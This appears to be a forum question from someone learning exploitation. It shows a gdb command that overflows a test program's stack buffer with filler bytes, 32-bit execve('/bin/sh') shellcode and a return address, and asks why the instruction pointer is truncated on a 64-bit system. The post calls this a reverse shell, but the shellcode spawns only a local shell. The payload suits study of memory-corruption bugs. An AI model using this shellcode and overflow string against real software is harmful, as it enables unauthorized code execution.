<p>i have a buffer overflow vulnerable code. and the following command is for exploit this vulnerable code and getting reverse shell. </p>  <p>(gdb) run <code>perl -e 'print "A"x240,"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80","\x57\xe6\xff\xff"'</code> </p>  <p>as you can see in the following picture , To get address of this shellcode at stack memory we can do a direct jump to begin of shellcode instructions. </p>  <p><a href="http://i.stack.imgur.com/IgP1x.png" rel="nofollow"><img src="http://i.stack.imgur.com/IgP1x.png" alt="enter image description here"></a></p>  <p>For direct jump method we need to check where shellcode instructions starts at stack memory. Let's see:</p>  <p><a href="http://i.stack.imgur.com/GBv4L.png" rel="nofollow"><img src="http://i.stack.imgur.com/GBv4L.png" alt="enter image description here"></a></p>  <p>as you can see the begin of shellcode is at 0x7fffffffe657. now when i run the above command for exploiting this code, i get the following prompt:</p>  <p>Program received signal SIGSEGV, Segmentation fault. 0x00000000ffffe657 in ?? ()</p>  <p>why the value of eip has became 0x00000000ffffe657?</p>